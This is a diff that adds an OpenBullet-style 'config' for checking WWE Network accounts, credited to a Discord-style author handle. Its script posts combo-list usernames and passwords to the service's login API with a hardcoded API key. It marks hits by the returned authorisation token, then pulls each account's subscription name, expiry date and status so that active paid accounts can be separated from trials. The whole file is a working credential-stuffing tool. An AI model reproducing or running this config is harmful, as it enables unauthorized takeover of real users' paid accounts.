@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "WWE",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-11T04:39:35.0970523-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 55" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://watch.wwe.com" 
+  HEADER "realm: dce.wwe" 
+  HEADER "referer: https://watch.wwe.com/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "authorisationToken" 
+  KEYCHAIN Failure OR 
+    KEY "NOT_FOUND" 
+
+PARSE "<SOURCE>" LR "authorisationToken\":\"" "\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/licence" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <TOKEN>" 
+  HEADER "content-length: 2" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://watch.wwe.com" 
+  HEADER "realm: dce.wwe" 
+  HEADER "referer: https://watch.wwe.com/account" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+
+PARSE "<SOURCE>" LR "\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "SUB" 
+
+PARSE "<SOURCE>" LR "\"expiryTimestamp\":" "," -> VAR "UNIX" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd" "<UNIX>" -> CAP "BILLING" 
+
+PARSE "<SOURCE>" LR "\"status\":\"" "\"" CreateEmpty=FALSE -> CAP "STATUS" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "INACTIVE" 
+    KEY "TRIAL_ACTIVE" 
+  KEYCHAIN Success AND 
+    KEY "\"ACTIVE\"" 
+    KEY "<SOURCE>" DoesNotContain "\"TRIAL_ACTIVE\"" 
+
